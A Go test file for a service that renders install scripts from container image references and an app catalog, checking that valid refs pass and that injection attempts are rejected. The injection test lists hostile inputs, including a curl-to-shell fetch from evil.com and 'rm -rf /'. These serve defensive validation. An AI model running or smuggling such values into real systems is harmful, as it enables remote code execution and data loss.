package main

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
	"text/template"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestInstallScriptHandler_ValidImageRefs(t *testing.T) {
	handler := testHandler()

	valid := []string{
		"nginx",
		"nginx:latest",
		"ghcr.io/basecamp/once-campfire",
		"ghcr.io/basecamp/fizzy:main",
		"registry.example.com:5000/my/image:v1.2.3",
		"ubuntu@sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
	}
	for _, ref := range valid {
		w := serveImage(handler, ref)
		assert.Equal(t, http.StatusOK, w.Code, "ref: %s", ref)
		assert.Contains(t, w.Body.String(), "INSTALL_REF='"+ref+"'")
	}
}

func TestInstallScriptHandler_RejectsShellInjection(t *testing.T) {
	handler := testHandler()

	malicious := []string{
		"foo';curl evil.com|sh;echo'",
		"$(whoami)",
		"`id`",
		"image;rm -rf /",
		"foo\necho pwned",
		"foo&background",
		"a>b",
		"a<b",
		"foo$(bar)",
		"image name with spaces",
	}
	for _, ref := range malicious {
		w := serveImage(handler, ref)
		assert.Equal(t, http.StatusBadRequest, w.Code, "ref: %s", ref)
	}
}

func TestInstallScriptHandler_EmptyImageRef(t *testing.T) {
	handler := testHandler()

	w := serveImage(handler, "")
	assert.Equal(t, http.StatusOK, w.Code)
}

func TestAppsHandlerServesEmbeddedCatalog(t *testing.T) {
	catalog := testCatalog(t)
	handler := newAppsHandler(catalog)

	r := httptest.NewRequest("GET", "/apps.json", nil)
	w := httptest.NewRecorder()
	handler(w, r)

	require.Equal(t, http.StatusOK, w.Code)
	assert.Equal(t, "application/json", w.Header().Get("Content-Type"))

	var response Catalog
	require.NoError(t, json.Unmarshal(w.Body.Bytes(), &response))
	require.Len(t, response.Apps, 3)
	assert.Equal(t, "campfire", response.Apps[0].ID)
	assert.Equal(t, "ghcr.io/basecamp/once-campfire", response.Apps[0].Image)
}

func TestAppInstallScriptHandler(t *testing.T) {
	tmpl := testTemplate()
	handler := newAppInstallScriptHandler(tmpl, testCatalog(t))

	t.Run("embedded app", func(t *testing.T) {
		w := serveApp(handler, "campfire")
		assert.Equal(t, http.StatusOK, w.Code)
		assert.Contains(t, w.Body.String(), "INSTALL_REF='campfire'")
		assert.Contains(t, w.Body.String(), "--install=${INSTALL_REF}")
	})

	t.Run("unknown app", func(t *testing.T) {
		w := serveApp(handler, "missing")
		assert.Equal(t, http.StatusNotFound, w.Code)
	})

	t.Run("invalid id", func(t *testing.T) {
		w := serveApp(handler, "Bad_ID")
		assert.Equal(t, http.StatusBadRequest, w.Code)
	})
}

// Helpers

func testHandler() http.HandlerFunc {
	return newInstallScriptHandler(testTemplate())
}

func testTemplate() *template.Template {
	return template.Must(template.ParseFS(templateFS, "templates/*"))
}

func testCatalog(t *testing.T) Catalog {
	t.Helper()
	catalog, err := loadCatalog()
	require.NoError(t, err)
	return catalog
}

func serveImage(handler http.HandlerFunc, imageRef string) *httptest.ResponseRecorder {
	r := httptest.NewRequest("GET", "/image", nil)
	r.SetPathValue("image", imageRef)
	w := httptest.NewRecorder()
	handler(w, r)
	return w
}

func serveApp(handler http.HandlerFunc, id string) *httptest.ResponseRecorder {
	r := httptest.NewRequest("GET", "/apps/"+id, nil)
	r.SetPathValue("id", id)
	w := httptest.NewRecorder()
	handler(w, r)
	return w
}
